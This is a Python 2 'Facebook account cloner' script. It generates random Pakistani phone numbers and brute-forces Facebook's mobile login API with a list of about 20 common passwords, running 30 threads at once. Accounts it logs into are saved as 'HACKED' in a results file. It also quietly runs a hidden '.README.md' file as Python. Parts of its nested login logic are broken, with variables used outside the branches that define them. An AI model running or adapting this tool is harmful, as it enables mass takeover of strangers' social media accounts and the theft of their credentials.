import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(40000):
    nmbr = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit Successfully'
    os.sys.exit()


def exxb():
    print '[!] \x1b[1;91mTHIS OPTION NOT AVAILABLE AT THE MOMENT.BUT \x1b[3;92;40m COM\x1b[1;95mING SO\x1b[1;97mON \x1b[1;91m\x1b[0;34;40m'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


def lodhirt():
    lodhirt = [
     'SOMI BRAND', '      ', 'SOMI BRAND', '           ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND\n']
    for o in lodhirt:
        print '\r\x1b[1;94m                     \x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.1)


def jaalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(2.0 / 9900)


def t():
    time.sleep(1)


def cb():
    os.system('clear') 
logo = "\n\x1b[1;91m  _____    _____     __   __   _______\n\x1b[1;95m (_____)  (_____)   (__)_(__) (_______)\n\x1b[1;92m(_)___   (_)   (_) (_) (_) (_)   (_)   \n \x1b[1;91m (___)_ (_)   (_) (_) (_) (_)   (_)   \n\x1b[1;97m  ____(_)(_)___(_) (_)     (_) __(_)__ \n\x1b[1;92m (_____)  (_____)  (_)     (_)(_______)\n \x1b[1;90m    FACEBOOK ACCOUNT CLONER BY \x1b[3;90mSOMI BRAND\x1b[0;37;40m\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\x1b[1;92m\xe2\x96\xb8 \x1b[3;95mDEVOLPER       : SOMI AWAN\n\x1b[3;92m\xe2\x96\xb8 \x1b[3;96mWHATSAPP NO   : +923455453538\n\x1b[1;92m\xe2\x96\xb8 \x1b[3;93mNOTE    : PLZ DON,T CALL ME ONLY TEXT\n\x1b[3;93m\xe2\x96\xb8 \x1b[1;94mNOTE     : USE FAST 4G SIM NET\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80"
back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    lodhirt()
    print
   
    jaalan('\x1b[1;92m[\x1b[1;92m2\x1b[1;91m]  \x1b[1;93mPAKISTAN ALL PASSWORD CLONE')
    jalan('DONT USE FACEBOOK LOGIN COMMAND ONLY TIME WASTE. SO I RECOMMEND YOU TO DONT USE IT. BUT IF YOU WANT TO WASTE YOUR TIME THEN USE IT')
    print
    print
    print
    jalan('\x1b[1;91m[\x1b[1;93m20\x1b[1;91m] \x1b[1;92mSOMI \x1b[1;91m[\x1b[1;93m21\x1b[1;91m] \x1b[1;92mFOLLOW \x1b[1;91m[\x1b[1;93m22\x1b[1;91m] \x1b[1;92mCONTACT \x1b[1;91m[\x1b[1;93m00\x1b[1;91m] \x1b[1;92mEXIT')
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\n \x1b[1;96m>   ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 0300  TO 0349  :  ')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '00':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] TOTAL NUMBERS: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] PLEASE WAIT, PROCESS IS STAR ...')
    time.sleep(0.5)
    psb('[!] TO STOP THIS PROCESS PRESS Ctrl THEN z')
    time.sleep(0.5)
    print 47* '-'
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = 'Facebook'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass2 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass2 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '786786'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass3 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass3 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'Pakistan786'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass4 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass4 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                            pass5 = 'pakistan123'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass5 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass5 + '\n')
                okb.close()
                oks.append(c + user + pass5)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass5 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass5 + '\n')
                cps.close()
                cpb.append(c + user + pass5)
            else:
                pass6 = 'khan123'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass6 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass6 + '\n')
                    okb.close()
                    oks.append(c + user + pass6)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass6 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass6 + '\n')
                    cps.close()
                    cpb.append(c + user + pass6)
                else:
                    pass7 = 'khan786'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass7 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass7 + '\n')
                        okb.close()
                        oks.append(c + user + pass7)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass7 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass7 + '\n')
                        cps.close()
                        cpb.append(c + user + pass7)
                    else:
                        pass8 = '000786'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass8 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass8 + '\n')
                            okb.close()
                            oks.append(c + user + pass8)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass8 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass8 + '\n')
                            cps.close()
                            cpb.append(c + user + pass8)
                            pass9 = 'programmer123'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass9 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass9 + '\n')
                okb.close()
                oks.append(c + user + pass9)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass9 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass9 + '\n')
                cps.close()
                cpb.append(c + user + pass9)
            else:
                pass10 = 'pak123'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass10 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass10 + '\n')
                    okb.close()
                    oks.append(c + user + pass10)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass10 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass10 + '\n')
                    cps.close()
                    cpb.append(c + user + pass10)
                else:
                    pass11 = 'malik123'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass11 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass11 + '\n')
                        okb.close()
                        oks.append(c + user + pass11)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass11 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass11 + '\n')
                        cps.close()
                        cpb.append(c + user + pass11)
                    else:
                        pass12 = 'pak123'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass12 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass12 + '\n')
                            okb.close()
                            oks.append(c + user + pass12)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass12 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass12 + '\n')
                            cps.close()
                            cpb.append(c + user + pass12)
                            pass13 = '801639'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass13 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass13 + '\n')
                okb.close()
                oks.append(c + user + pass13)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass13 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass13 + '\n')
                cps.close()
                cpb.append(c + user + pass13)
            else:
                pass14 = '926291'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass14 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass14 + '\n')
                    okb.close()
                    oks.append(c + user + pass14)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass14 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass14 + '\n')
                    cps.close()
                    cpb.append(c + user + pass14)
                else:
                    pass15 = 'pakistan1234'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass15 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass15 + '\n')
                        okb.close()
                        oks.append(c + user + pass15)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass15 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass15 + '\n')
                        cps.close()
                        cpb.append(c + user + pass15)
                    else:
                        pass16 = 'pakistan12345'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass16 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass16 + '\n')
                            okb.close()
                            oks.append(c + user + pass16)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass16 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass16 + '\n')
                            cps.close()
                            cpb.append(c + user + pass16)
                            pass17 = 'awan123'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass17 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass17 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass17 + '\n')
                okb.close()
                oks.append(c + user + pass17)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass17 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass17 + '\n')
                cps.close()
                cpb.append(c + user + pass17)
            else:
                pass18 = 'password@'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass18 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass18 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass18 + '\n')
                    okb.close()
                    oks.append(c + user + pass18)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass18 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass18 + '\n')
                    cps.close()
                    cpb.append(c + user + pass18)
                else:
                    pass19 = '786000'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass19 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass19 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass19 + '\n')
                        okb.close()
                        oks.append(c + user + pass19)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass19 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass19 + '\n')
                        cps.close()
                        cpb.append(c + user + pass19)
                    else:
                        pass20 = 'jutt123'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass20 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass20 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass20 + '\n')
                            okb.close()
                            oks.append(c + user + pass20)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[AFTER 7DAYS] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass20 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass20 + '\n')
                            cps.close()
                            cpb.append(c + user + pass20)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '-'
    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
    print '[\xe2\x9c\x93] \x1b[1;96mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : save/checkpoint.txt'
    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
    os.system('python2 .README.md')


if __name__ == '__main__':
    menu()
